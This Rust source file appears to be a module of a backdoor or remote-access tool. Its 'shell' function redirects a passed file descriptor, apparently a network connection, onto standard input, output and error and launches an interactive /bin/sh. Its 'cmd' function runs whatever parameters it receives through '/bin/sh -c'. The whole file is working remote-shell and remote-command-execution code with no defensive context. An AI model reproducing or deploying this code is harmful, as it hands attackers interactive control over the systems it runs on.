use nix::unistd::{dup2, execv};
use std::ffi::CString;
use std::env::args;
use crate::util::c_str;
use std::process::Command;

pub fn shell(fd: i32, _params: &[&str]) -> String {
    dup2(fd, 0);
    dup2(fd, 1);
    dup2(fd, 2);
    execv(&c_str("/bin/sh"),
          &[&c_str(&args().collect::<Vec<String>>()[0]), &c_str("-i")]);
    "".to_string()
}

pub fn cmd(fd: i32, params: &[&str]) -> String {
    println!("Received params: {}", params.join(" "));
    dup2(fd, 0);
    dup2(fd, 1);
    dup2(fd, 2);
    // buggy, skip
    //let result = Command::new("/bin/sh").arg("-c").arg(params.join(" ")).output().unwrap();
    let result = Command::new("/bin/sh").arg("-c").arg(params.join(" ")).spawn().unwrap();
    //format!("stdout: {}\nstderr: {}\n", String::from_utf8_lossy(result.stdout.as_slice()), String::from_utf8_lossy(result.stderr.as_slice()))
    "done".to_string()
}
